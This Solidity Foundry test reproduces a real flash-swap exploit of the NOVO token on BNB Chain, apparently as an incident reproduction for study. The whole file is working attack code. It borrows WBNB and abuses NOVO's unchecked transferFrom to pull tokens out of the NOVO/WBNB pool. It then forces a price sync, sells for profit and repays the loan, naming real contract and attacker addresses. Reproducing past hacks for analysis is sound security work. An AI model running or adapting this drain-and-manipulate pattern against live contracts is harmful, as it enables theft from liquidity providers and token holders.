// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// Exploit Alert ref: https://www.panewslab.com/zh_hk/articledetails/f40t9xb4.html
// Origin Attack Transaction: 0xc346adf14e5082e6df5aeae650f3d7f606d7e08247c2b856510766b4dfcdc57f
// Blocksec Txinfo: https://versatile.blocksecteam.com/tx/bsc/0xc346adf14e5082e6df5aeae650f3d7f606d7e08247c2b856510766b4dfcdc57f

// Attack Addr: 0x31a7cc04987520cefacd46f734943a105b29186e
// Attack Contract: 0x3463a663de4ccc59c8b21190f81027096f18cf2a

// Vulnerable Contract: https://bscscan.com/address/0xa0787daad6062349f63b7c228cbfd5d8a3db08f1#code

interface INOVOLP {
    function sync() external;
}

contract ContractTest is Test {
    IPancakePair PancakePair = IPancakePair(0xEeBc161437FA948AAb99383142564160c92D2974);
    IPancakeRouter PancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    INOVO novo = INOVO(0x6Fb2020C236BBD5a7DDEb07E14c9298642253333);
    INOVOLP novoLP = INOVOLP(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 18_225_002); //fork bsc at block number 18225002
    }

    function testExploit() public {
        wbnb.deposit{value: 10 * 1e18}();
        emit log_named_decimal_uint("[Start] Attacker WBNB balance before exploit", wbnb.balanceOf(address(this)), 18);

        // Brrow 17.2 WBNB
        bytes memory data = abi.encode(0xEeBc161437FA948AAb99383142564160c92D2974, 172 * 1e17);
        PancakePair.swap(0, 172 * 1e17, address(this), data);

        emit log_named_decimal_uint("[End] After repay, WBNB balance of attacker", wbnb.balanceOf(address(this)), 18);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        // 攻擊者先買入 NOVO Token
        // 透過 NOVO Token 的 transferFrom 未過濾 `from`
        // `from` 指定為 NOVO/WBNB 的 LP pool, 即可操縱 PancakeSwap NOVO/WBNB 的價格
        // 攻擊者再賣出 flashswap 借來的 NOVO Token 即可獲利

        address[] memory path = new address[](2);

        emit log_named_decimal_uint("[*] Attacker flashswap Borrow WBNB", amount1, 18);

        // Use borrow WBNB to swap some NOVO token
        emit log_string("[*] Attacker going swap some NOVO...");
        wbnb.approve(address(PancakeRouter), type(uint256).max);
        path[0] = address(wbnb);
        path[1] = address(novo);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            172 * 1e17, 1, path, address(this), block.timestamp
        ); // get 4,749,070,146,640,911 NOVO Token
        require(novo.balanceOf(address(this)) != 0, "Swap Failed");

        // Sync NOVO token balance before exploit
        emit log_named_decimal_uint("\t[INFO] Attacker NOVO balance", novo.balanceOf(address(this)), 9);
        emit log_named_decimal_uint("\t[INFO] PancakeSwap NOVO/WBNB LP balance", novo.balanceOf(address(novoLP)), 9);

        // Manipulate the LP of NOVO/WBNB => Manipulate the NOVO/WBNB price
        emit log_string("[E] Attacker going manipulate NOVO/WBNB LP...");
        novo.transferFrom(address(novoLP), address(novo), 113_951_614_762_384_370); // 113,951,614.76238437 NOVO Token
        emit log_named_decimal_uint("\t[INFO] PancakeSwap NOVO/WBNB LP balance", novo.balanceOf(address(novoLP)), 9);

        // Sync NOVO/WBNB price
        novoLP.sync();

        // Swap NOVO to WBNB, make attacker profit
        emit log_string("[*] Attacker going swap some WBNB...");
        novo.approve(address(PancakePair), novo.balanceOf(address(this)));
        path[0] = address(novo);
        path[1] = address(wbnb);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            novo.balanceOf(address(this)), 1, path, address(this), block.timestamp
        );
        require(wbnb.balanceOf(address(this)) > 172 * 1e17, "Exploit Failed");

        // Payback the flashswap, will be `BorrowAmount` + 0.25% fee
        require(wbnb.transfer(address(PancakePair), amount1 + 4472 * 10e13), "Payback Failed");
    }

    receive() external payable {}
}
